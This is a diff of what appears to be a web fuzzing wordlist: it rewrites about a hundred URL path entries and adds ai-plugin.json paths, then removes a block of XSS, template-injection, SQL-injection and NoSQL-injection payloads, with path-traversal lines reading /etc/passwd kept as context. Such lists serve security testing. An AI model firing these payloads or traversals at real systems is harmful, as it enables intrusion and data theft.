@@ -604,107 +604,109 @@
 .zfs/
 .zip
 /
-/$$$call$$$/page/page
-/$-$
-/$discovery
-/$rpc/google.internal.waa.v1.Waa
-/$web
-/**
-/++api++
-/++resource++country-flags
-/++resource++poi.templates_mdw/js
-/++theme++mdw/css-compiled
-/++theme++mdw/img/favicons
-/++theme++plone/js
-/++theme++wageindicator
-/+CSCOE+
-/+CSCOU+
-/-
-/-/AjaxSearch
-/-/build
-/-/events
-/-/globalheader/ffffff/ffffff
-/-/img
-/-/media
-/-/media/base-themes/maps/scripts
-/-/media/Base-Themes/Maps/Scripts
-/-/media/base-themes/xa-api/scripts
-/-/media/Base-Themes/XA-API/Scripts
-/-/media/Global/Country
-/-/media/group_site/en/global
-/-/media/images
-/-/media/Images/Logos
-/-/media/project/gems/shared
-/-/ReactWebsite
-/-/top/img
-/-/widgets
-/-_-/common/fonts
-/-_-/common/styles
-/-home_default
-/-resellers-preview/_social_icons
-/-stylesheets
-/-wvhttp-01-
-/.a
-/.app
-/.assets
-/.assets/thumbnail
-/.cm4all
-/.cm4all/e/static/img
-/.cm4all/handler.php
-/.cm4all/mediadb
-/.cm4all/res/static/jquery-1.7
-/.cm4all/res/static/jslib/1.2.1/js
-/.cm4all/res/static/prototype-1.7.3
-/.cm4all/sysdb/favicon
-/.cm4all/uproc.php/0
-/.cm4all/uro/assets/js
-/.framework/themes/silver/css
-/.landinghub
-/.metrics
-/.netlify/functions
-/.nuxt
-/.resources/scripts
-/.resources/styles
-/.resources/zeg-theme/img/marken
-/.s/img/cp
-/.s/img/icon/social
-/.s/img/ma
-/.s/img/stars/3
-/.s/img/wd/1
-/.s/img/wd/2
-/.s/src
-/.s/src/css
-/.s/src/ulightbox
-/.shared-cocolog/js
-/.shared-cocolog/js/multibox
-/.shared-cocolog/js/web
-/.shared-cocolog/themes/common
-/.shared-pleasy/js
-/.shared-pleasy/js/multibox
-/.shared-pleasy/js/web
-/.shared-pleasy/nifty_managed/css
-/.shared-pleasy/nifty_managed/js
-/.shared-pleasy/themes/common
-/.shared/css
-/.shared/default-userpics
-/.shared/js
-/.shared/js/yui
-/.shared/themes/common
-/.shared/themes/common/framework
-/.shared/themes/common/images
-/.shared/themes/jim/chroma
-/.shared/themes/walt/styleless
-/.sw_/_host_
-/.webscale
-/.well-known
-/.well-known/assetlinks.json
-/.well-known/csp
-/.well-known/jwks.json
-/.well-known/openid-configuration
-/.well-known/pki-validation
-/.well-known/sgcaptcha
-/.well-known/shopify/monorail/v1
-/.wf_graphql
+$$$call$$$/page/page
+$-$
+$discovery
+$rpc/google.internal.waa.v1.Waa
+$web
+**
+++api++
+++resource++country-flags
+++resource++poi.templates_mdw/js
+++theme++mdw/css-compiled
+++theme++mdw/img/favicons
+++theme++plone/js
+++theme++wageindicator
++CSCOE+
++CSCOU+
+-
+-/AjaxSearch
+-/build
+-/events
+-/globalheader/ffffff/ffffff
+-/img
+-/media
+-/media/base-themes/maps/scripts
+-/media/Base-Themes/Maps/Scripts
+-/media/base-themes/xa-api/scripts
+-/media/Base-Themes/XA-API/Scripts
+-/media/Global/Country
+-/media/group_site/en/global
+-/media/images
+-/media/Images/Logos
+-/media/project/gems/shared
+-/ReactWebsite
+-/top/img
+-/widgets
+-_-/common/fonts
+-_-/common/styles
+-home_default
+-resellers-preview/_social_icons
+-stylesheets
+-wvhttp-01-
+.a
+.app
+.assets
+.assets/thumbnail
+.cm4all
+.cm4all/e/static/img
+.cm4all/handler.php
+.cm4all/mediadb
+.cm4all/res/static/jquery-1.7
+.cm4all/res/static/jslib/1.2.1/js
+.cm4all/res/static/prototype-1.7.3
+.cm4all/sysdb/favicon
+.cm4all/uproc.php/0
+.cm4all/uro/assets/js
+.framework/themes/silver/css
+.landinghub
+.metrics
+.netlify/functions
+.nuxt
+.resources/scripts
+.resources/styles
+.resources/zeg-theme/img/marken
+.s/img/cp
+.s/img/icon/social
+.s/img/ma
+.s/img/stars/3
+.s/img/wd/1
+.s/img/wd/2
+.s/src
+.s/src/css
+.s/src/ulightbox
+.shared-cocolog/js
+.shared-cocolog/js/multibox
+.shared-cocolog/js/web
+.shared-cocolog/themes/common
+.shared-pleasy/js
+.shared-pleasy/js/multibox
+.shared-pleasy/js/web
+.shared-pleasy/nifty_managed/css
+.shared-pleasy/nifty_managed/js
+.shared-pleasy/themes/common
+.shared/css
+.shared/default-userpics
+.shared/js
+.shared/js/yui
+.shared/themes/common
+.shared/themes/common/framework
+.shared/themes/common/images
+.shared/themes/jim/chroma
+.shared/themes/walt/styleless
+.sw_/_host_
+.webscale
+.well-known
+.well-known/assetlinks.json
+.well-known/csp
+.well-known/jwks.json
+.well-known/openid-configuration
+.well-known/pki-validation
+.well-known/sgcaptcha
+.well-known/shopify/monorail/v1
+.well-known/ai-plugin.json
+ai-plugin.json
+.wf_graphql
 ////sp-docs/banners
 //Content/themes/Hotsite/img
 //Content/themes/HotSite/img
@@ -200319,113 +200321,3 @@ zéro
 ../../../../../etc/passwd
 ../../../../../etc/issue
 ../../../../../boot.ini
-%2e%68%74%61%63%63%65%73%73
-\'-alert(1)/
-<x 1='1'onxxx=1
-<x 1="1"onxxx=1
-onload=alert(1)>
-<x 1=">" onxxx=1
-<script>alert(1)/
-<x onxxx=1 onxxx=1
-<http://onxxx%3D1/
-<script>alert(1)<!–
-%3Cx onxxx=alert(1)
-<x onxxx=alert(1) 1='
-"onmouseover=alert(1)/
-"><svg onload=alert(1)/
-<svg/onload=alert('XSS')>
-'onload=alert(1)><svg/1='
-<script>alert(1)</script>
-"><svg/onload=alert(/XSS/)
-<marquee onstart=alert(1)>
-<x oncut=alert(1)>cut this!
-<script src=//3334957647/1>
-<script>alert('XSS')</script>
-"autofocus/onfocus=alert(1)/
-<x oncopy=alert(1)>copy this!
-<x ondrag=alert(1)>drag this!
-*/alert(1)</script><script>/*
-</script><svg onload=alert(1)>
-'>alert(1)</script><script/1='
-`-alert(1)">'onload="`<svg/1='
-"><script>alert('XSS')</script>
-<video/poster/onerror=alert(1)>
-<x onclick=alert(1)>click this!
-*/alert(1)">'onload="/*<svg/1='
-<embed src=javascript:alert(1)>
-<audio src onloadstart=alert(1)>
-<script>top['alert'](3)</script>
-<script src=javascript:alert(1)>
-<iframe src=javascript:alert(1)>
-<img src=x onerror=alert('XSS');>
-<svg id=alert(1) onload=eval(id)>
-<body onload=alert(/XSS/.source)>
-<img src='1' onerror/=alert(0) />
-<script>self['alert'](2)</script>
-<x onmouseup=alert(1)>click this!
-<a href=javascript:alert(1)>click
-<input autofocus onfocus=alert(1)>
-<details/open/ontoggle="alert`1`">
-<x onmouseout=alert(1)>hover this!
-*/</script>'>alert(1)/*<script/1='
-${6*6}
-@(6+5)
-#{3*3}
-*{7*7}
-{{3*3}}
-${{3*3}}
-{{self}}
-{{3*'3'}}
-#{ 3 * 3 }
-<%= 3 * 3 %>
-{{dump(app)}}
-{{ request }}
-{{2*2}}[[3*3]]
-{$smarty.version}
-{{config.items()}}
-{php}echo `id`;{/php}
-{{request.__class__}}
-{{'a'.toUpperCase()}} 
-{{['id']|filter('system')}}
-{{request|attr("__class__")}}
-${T(java.lang.System).getenv()}
-{{ [].class.base.subclasses() }}
-' or 1=1 -- 
-; --
-'; --
-'); --
-1 or 1=1
-1' or '1'='1
-1or1=1
-1'or'1'='1
-true, $where: '1 == 1'
-, $where: '1 == 1'
-$where: '1 == 1'
-', $where: '1 == 1'
-1, $where: '1 == 1'
-{ $ne: 1 }
-{$gt: ''}
-[$ne]=1
-|| 1==1
-’ or ‘1’=’1
-' or '1'='1
- OR 1=1
- OR 1=0
- OR x=x
- OR x=y
- OR 1=1#
- OR 1=0#
- OR x=x#
- OR x=y#
- OR 1=1-- 
- OR 1=0-- 
- OR x=x-- 
- OR x=y-- 
-  AND 1=1
- AND 1=0
- AND 1=1-- 
- AND 1=0-- 
- AND 1=1#
- AND 1=0#
- AND 1=1 AND '%'='
- AND 1=0 AND '%'='
